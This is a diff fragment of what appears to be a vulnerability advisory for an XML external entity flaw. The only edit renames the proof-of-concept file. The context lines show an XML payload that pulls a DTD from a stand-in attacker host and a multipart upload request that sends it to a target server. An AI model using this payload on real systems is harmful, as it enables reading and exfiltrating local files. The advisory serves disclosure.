@@ -23,7 +23,7 @@ The XML parser processes external entities. A crafted XML can read local files (
 
 ## PoC
 
-**evil11.xml**
+**evil.xml**
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE xxe SYSTEM "http://ATTACKER/malicious.dtd">
@@ -44,7 +44,7 @@ Host: <target>:8080
 Content-Type: multipart/form-data; boundary=----X
 
 ------X
-Content-Disposition: form-data; name="xml_file"; filename="evil11.xml"
+Content-Disposition: form-data; name="xml_file"; filename="evil.xml"
 Content-Type: application/xml
 
 <?xml version="1.0"?>
